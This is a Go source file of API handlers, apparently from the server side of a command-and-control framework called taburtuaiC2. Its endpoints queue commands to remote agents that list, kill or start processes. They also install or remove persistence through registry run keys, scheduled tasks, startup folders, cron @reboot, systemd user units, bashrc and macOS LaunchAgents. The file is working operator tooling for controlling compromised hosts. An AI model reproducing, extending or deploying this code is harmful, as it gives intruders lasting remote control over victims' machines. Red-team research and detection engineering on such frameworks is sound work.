package api

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/server/services"
	"github.com/mjopsec/taburtuaiC2/shared/types"
)

// ListProcesses queues a process list command
func (h *Handlers) ListProcesses(c *gin.Context) {
	agentID := c.Param("id")

	if _, exists := h.server.Monitor.GetAgent(agentID); !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       "internal_process_list",
		OperationType: "process_list",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       60,
	}

	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "LIST_PROCESSES", "Queued", true)

	h.APIResponse(c, true, "Process list command queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// KillProcess queues a process kill command
func (h *Handlers) KillProcess(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	var req struct {
		ProcessID   int    `json:"process_id"`
		ProcessName string `json:"process_name"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	if req.ProcessID == 0 && req.ProcessName == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Either process_id or process_name required")
		return
	}

	targetLog := ""
	if req.ProcessID != 0 {
		targetLog = fmt.Sprintf("PID %d", req.ProcessID)
	} else {
		targetLog = fmt.Sprintf("Name '%s'", req.ProcessName)
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       fmt.Sprintf("internal_process_kill %s", targetLog),
		OperationType: "process_kill",
		ProcessID:     req.ProcessID,
		ProcessName:   req.ProcessName,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}

	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("KILL_PROCESS %s", targetLog), "Queued", true)

	h.APIResponse(c, true, fmt.Sprintf("Process kill command queued for %s", targetLog),
		map[string]interface{}{"command_id": cmd.ID}, "")
}

// StartProcess queues a process start command
func (h *Handlers) StartProcess(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	var req struct {
		ProcessPath string `json:"process_path" binding:"required"`
		ProcessArgs string `json:"process_args"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       fmt.Sprintf("internal_process_start %s %s", req.ProcessPath, req.ProcessArgs),
		OperationType: "process_start",
		ProcessPath:   req.ProcessPath,
		ProcessArgs:   strings.Fields(req.ProcessArgs), // Convert to []string
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       60,
	}

	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("START_PROCESS %s", req.ProcessPath), "Queued", true)

	h.APIResponse(c, true, "Process start command queued",
		map[string]interface{}{"command_id": cmd.ID}, "")
}

// SetupPersistence sets up persistence mechanism
// SetupPersistence sets up persistence mechanism
func (h *Handlers) SetupPersistence(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	var req struct {
		PersistMethod string `json:"persist_method" binding:"required"`
		PersistName   string `json:"persist_name"`
		ProcessPath   string `json:"process_path" binding:"required"`
		ProcessArgs   string `json:"process_args"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	// Validate persistence method
	validMethods := map[string]bool{
		// Windows methods
		"registry_run":     true,
		"schtasks_onlogon": true,
		"schtasks_daily":   true,
		"startup_folder":   true,
		// Linux methods
		"cron_reboot":  true,
		"systemd_user": true,
		"bashrc":       true,
		// macOS methods
		"launchagent": true,
		// Legacy aliases (will be normalized by agent)
		"registry":  true,
		"reg":       true,
		"run":       true,
		"schtask":   true,
		"task":      true,
		"scheduled": true,
		"startup":   true,
		"folder":    true,
		"cron":      true,
		"systemd":   true,
		"service":   true,
		"bash":      true,
		"shell":     true,
		"launch":    true,
		"agent":     true,
		"plist":     true,
	}

	if !validMethods[req.PersistMethod] {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid persistence method: %s", req.PersistMethod))
		return
	}

	// Auto-generate name if not provided
	if req.PersistName == "" {
		req.PersistName = fmt.Sprintf("Taburtuai_%s_%s", req.PersistMethod, uuid.New().String()[:8])
	}

	// Validate process path
	if req.ProcessPath == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Process path is required")
		return
	}

	// Log the persistence setup attempt
	h.server.Logger.LogCommandExecution(agentID,
		fmt.Sprintf("PERSIST_SETUP %s:%s", req.PersistMethod, req.PersistName),
		"Queued", true)

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       fmt.Sprintf("internal_persist_setup: %s", req.PersistMethod),
		OperationType: "persist_setup",
		PersistMethod: req.PersistMethod,
		PersistName:   req.PersistName,
		ProcessPath:   req.ProcessPath,
		ProcessArgs:   strings.Fields(req.ProcessArgs),
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       120,
		Metadata: map[string]string{
			"persist_method": req.PersistMethod,
			"persist_name":   req.PersistName,
			"process_path":   req.ProcessPath,
			"process_args":   req.ProcessArgs,
			"requested_by":   c.ClientIP(),
		},
	}

	// Add to queue
	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
		h.server.Logger.Error("SYSTEM", fmt.Sprintf("Failed to queue persistence setup: %v", err), agentID, "", nil)
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to queue persistence setup command")
		return
	}

	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("PERSIST_SETUP %s", req.PersistMethod), "Queued", true)

	// Enhanced response format
	h.APIResponse(c, true, "Persistence setup command queued", map[string]interface{}{
		"command_id":   cmd.ID,
		"persist_name": req.PersistName,
		"method":       req.PersistMethod,
		"path":         req.ProcessPath,
		"args":         req.ProcessArgs,
		"timeout":      cmd.Timeout,
		"created_at":   cmd.CreatedAt.Format(time.RFC3339),
	}, "")
}

func (h *Handlers) RemovePersistence(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	var req struct {
		PersistMethod string `json:"persist_method" binding:"required"`
		PersistName   string `json:"persist_name" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	// Validate persistence method
	validMethods := map[string]bool{
		// Windows methods
		"registry_run":     true,
		"schtasks_onlogon": true,
		"schtasks_daily":   true,
		"startup_folder":   true,
		// Linux methods
		"cron_reboot":  true,
		"systemd_user": true,
		"bashrc":       true,
		// macOS methods
		"launchagent": true,
		// Legacy aliases
		"registry":  true,
		"reg":       true,
		"run":       true,
		"schtask":   true,
		"task":      true,
		"scheduled": true,
		"startup":   true,
		"folder":    true,
		"cron":      true,
		"systemd":   true,
		"service":   true,
		"bash":      true,
		"shell":     true,
		"launch":    true,
		"agent":     true,
		"plist":     true,
	}

	if !validMethods[req.PersistMethod] {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid persistence method: %s", req.PersistMethod))
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       fmt.Sprintf("internal_persist_remove: %s", req.PersistMethod),
		OperationType: "persist_remove",
		PersistMethod: req.PersistMethod,
		PersistName:   req.PersistName,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       120,
		Metadata: map[string]string{
			"persist_method": req.PersistMethod,
			"persist_name":   req.PersistName,
			"requested_by":   c.ClientIP(),
		},
	}

	// Add to queue
	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
		h.server.Logger.Error("SYSTEM", fmt.Sprintf("Failed to queue persistence removal: %v", err), agentID, "", nil)
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to queue persistence removal command")
		return
	}

	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("PERSIST_REMOVE %s", req.PersistMethod), "Queued", true)

	// Enhanced response format
	h.APIResponse(c, true, "Persistence removal command queued", map[string]interface{}{
		"command_id": cmd.ID,
		"method":     req.PersistMethod,
		"name":       req.PersistName,
		"timeout":    cmd.Timeout,
		"created_at": cmd.CreatedAt.Format(time.RFC3339),
	}, "")
}
